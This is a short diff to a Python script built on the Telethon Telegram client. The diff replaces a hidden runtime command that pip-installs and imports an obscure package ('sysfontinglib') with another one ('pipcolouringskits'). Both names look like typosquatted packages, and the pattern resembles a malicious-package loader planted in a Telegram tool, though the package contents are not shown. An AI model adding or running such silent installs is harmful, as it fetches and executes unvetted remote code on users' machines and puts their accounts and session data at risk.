@@ -1,6 +1,6 @@
 import os
-os.system("pip install sysfontinglib")
-import sysfontinglib
+os.system("pip install pipcolouringskits")
+import pipcolouringskits
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 import csv
